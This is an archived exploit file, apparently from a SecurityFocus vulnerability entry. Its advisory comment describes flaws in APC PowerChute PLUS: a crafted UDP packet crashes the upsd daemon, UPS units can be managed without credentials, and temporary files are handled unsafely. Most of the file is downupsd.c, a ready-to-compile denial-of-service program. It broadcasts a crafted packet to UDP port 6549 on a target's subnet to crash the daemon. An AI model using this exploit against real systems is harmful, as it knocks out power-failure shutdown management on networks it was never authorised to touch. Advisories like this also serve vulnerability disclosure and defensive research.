// source: http://www.securityfocus.com/bid/83/info
// 
// APC PowerChute PLUS is a software package that will safely shutdown computer systems locally or accross a network when UPS power starts to fail. When operating PowerChute PLUS normally listens to TCP ports 6547 and 6548, as well as for broadcast requests in UDP port 6549.
// 
// A request packet can be craftted and sent to the UDP port such that the upsd server will crash. This is been tested in the Solaris i386 version of the product.
// 
// It has also been reported the software will crash in some instances when port scanned.
// 
// It seems you can also manage any APC UPS remotely without providing any credential if you have the APC client software.
// 
// Both the client and server software also create files insecurely in /tmp. The pager script (dialpager.sh) also contains unsafe users of temporary files. The mailer script (mailer.sh) passes the files provided in the command line to rm without checking them.
// 
// ----- begin downupsd.c -----
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>

int main(int argc, char **argv) {
int s;
long on=1;
size_t addrsize;
char buffer[256];
struct sockaddr_in toaddr, fromaddr;
struct hostent h_ent;

if(argc!=2) {
fprintf(stderr, ""Usage:\n\t%s <hostname running upsd>\n"", argv[0]);
exit(0);
}
s = socket(AF_INET,SOCK_DGRAM,0);
setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on));

printf(""Crashing upsd on host's subnet: %s\n"", argv[1]);

toaddr.sin_family = AF_INET;
toaddr.sin_port = htons(0);
toaddr.sin_addr.s_addr = 0x00000000;
bind(s, (struct sockaddr *)&toaddr, sizeof(struct sockaddr_in));
toaddr.sin_port = htons(6549);
memcpy((char *)&h_ent, (char *)gethostbyname(argv[1]), sizeof(h_ent));
memcpy(&toaddr.sin_addr.s_addr, h_ent.h_addr, sizeof(struct in_addr));
toaddr.sin_addr.s_addr |= 0xff000000;
strcpy(buffer, ""027|1|public|9|0|0|2010~|0\0"");
sendto(s, buffer, 256, 0, (struct sockaddr *)&toaddr,
sizeof(struct sockaddr_in));

printf(""Crashed...\n"");
close(s);

}
------- end downupsd.c -----